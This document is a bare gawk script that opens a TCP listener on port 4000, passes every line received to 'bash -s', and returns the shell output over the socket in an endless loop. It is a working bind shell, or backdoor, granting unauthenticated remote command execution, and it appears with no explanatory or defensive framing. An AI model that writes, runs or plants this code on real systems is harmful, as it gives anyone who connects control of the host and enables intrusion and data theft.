#! /usr/bin/gawk -f

BEGIN {

	server = "/inet/tcp/4000/0/0"
	bash = "bash -s"
	
	while ( 1 ) {
		while ( server |& getline command ) {
			print command | bash
			while ( bash | getline shelloutput ) {
				print shelloutput |& server
			}
		}
	}
	
	close( bash )
	close( server )

}
